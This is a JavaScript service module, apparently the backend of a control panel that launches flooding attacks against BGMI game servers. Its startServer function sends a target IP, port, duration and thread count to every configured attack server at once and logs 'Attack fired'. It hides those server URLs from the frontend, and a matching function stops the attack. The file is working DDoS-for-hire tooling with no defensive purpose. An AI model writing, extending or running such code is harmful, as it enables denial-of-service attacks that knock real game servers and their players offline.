const axios = require('axios');
const { bgmiApis, timeouts } = require('../config/bgmiConfig');

class BGMIService {
    constructor() {
        this.currentApiIndex = 0;
    }

    async initialize() {
        if (bgmiApis.length === 0) {
            throw new Error('No BGMI API URLs configured');
        }
        console.log(`🎮 BGMIService initialized with ${bgmiApis.length} endpoints`);
    }

    async checkHealth() {
        const results = await Promise.allSettled(
            bgmiApis.map(url =>
                axios.get(`${url}/status`, { timeout: timeouts.healthCheck })
                    .then(() => true)
                    .catch(() => false)
            )
        );

        const healthy = results.filter(r => r.value === true).length;
        const total = bgmiApis.length;

        return {
            healthy,
            total,
            successRate: total > 0 ? `${Math.round((healthy / total) * 100)}%` : '0%'
        };
    }

    getApiCount() {
        return bgmiApis.length;
    }

    // ── Fire ALL servers simultaneously ──────────────────────────────────────
    async startServer(ip, port, duration, threads = 8) {
        const results = await Promise.allSettled(
            bgmiApis.map(apiUrl =>
                axios.post(
                    `${apiUrl}/start-server`,
                    { ip, port, duration, threads },
                    { timeout: timeouts.startServer }
                ).then(response => ({ apiUrl, data: response.data }))
            )
        );

        const succeeded = results
            .filter(r => r.status === 'fulfilled' && r.value.data?.status === 'success')
            .map(r => r.value.apiUrl);

        const failed = results.filter(r =>
            r.status === 'rejected' ||
            (r.status === 'fulfilled' && r.value.data?.status !== 'success')
        ).length;

        console.log(`🚀 Attack fired: ${succeeded.length}/${bgmiApis.length} servers started, ${failed} failed`);

        if (succeeded.length === 0) {
            return {
                success: false,
                error: 'All API servers failed to start'
            };
        }

        // Return success — we don't expose individual server URLs
        return {
            success: true,
            serversStarted: succeeded.length,
            totalServers: bgmiApis.length,
            // Internal use only — panel.js stores this, never sends to frontend
            _activeUrls: succeeded
        };
    }

    // ── Stop all servers that were started for this attack ───────────────────
    async stopServers(activeUrls) {
        if (!activeUrls || activeUrls.length === 0) return { success: true };

        const results = await Promise.allSettled(
            activeUrls.map(apiUrl =>
                axios.post(
                    `${apiUrl}/stop-server`,
                    {},
                    { timeout: timeouts.stopServer }
                )
            )
        );

        const stopped = results.filter(r => r.status === 'fulfilled').length;
        console.log(`🛑 Stop sent to ${stopped}/${activeUrls.length} servers`);

        return { success: true, stopped, total: activeUrls.length };
    }

    async getStatus(apiUrl) {
        try {
            const response = await axios.get(
                `${apiUrl}/status`,
                { timeout: timeouts.statusCheck }
            );
            return { success: true, data: response.data };
        } catch (error) {
            return { success: false, error: error.response?.data || error.message };
        }
    }

    async cleanup() {
        console.log('🧹 BGMIService cleanup called');
    }
}

module.exports = new BGMIService();